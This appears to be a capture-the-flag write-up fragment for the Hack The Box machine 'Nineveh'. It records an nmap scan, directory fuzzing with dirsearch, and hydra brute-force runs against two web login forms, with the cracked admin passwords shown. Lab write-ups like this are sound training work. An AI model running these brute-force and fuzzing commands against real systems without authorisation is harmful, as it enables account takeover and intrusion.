#### Nmap

```bash
# Nmap 7.94SVN scan initiated Tue Dec 19 20:12:31 2023 as: nmap -p 80,443 -sCV -A -T4 -oN nmap/port-scan 10.129.38.166
Nmap scan report for nineveh.htb (10.129.38.166)
Host is up (0.051s latency).

PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesnt have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
|_http-title: Site doesnt have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_ssl-date: TLS randomness does not represent time

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Dec 19 20:12:50 2023 -- 1 IP address (1 host up) scanned in 18.57 seconds
```

#### Fuzzing 80

```bash
# dirsearch -u http://nineveh.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o fuzzing/dirsearch-80-medium
[09:43:12] 301 -  315B  - /department  ->  http://nineveh.htb/department/
```
##### Brute force login

```bash
# hydra -l admin -P /usr/share/wordlists/rockyou.txt -f nineveh.htb http-post-form "/department/login.php:username=^USER^&password=^PASS^:F=Invalid Password"
[80][http-post-form] host: nineveh.htb   login: admin   password: 1q2w3e4r5t
```
#### Fuzzing 443

```bash
# dirsearch -u https://nineveh.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o fuzzing/dirsearch-443-medium
[09:20:30] 301 -  309B  - /db  ->  https://nineveh.htb/db/                                 
[09:27:15] 301 -  319B  - /secure_notes  ->  https://nineveh.htb/secure_notes/
```

##### Brute force login

```bash
# hydra -l admin -P /usr/share/wordlists/rockyou.txt -f nineveh.htb https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password" -t 64
[443][http-post-form] host: nineveh.htb   login: admin   password: password123
```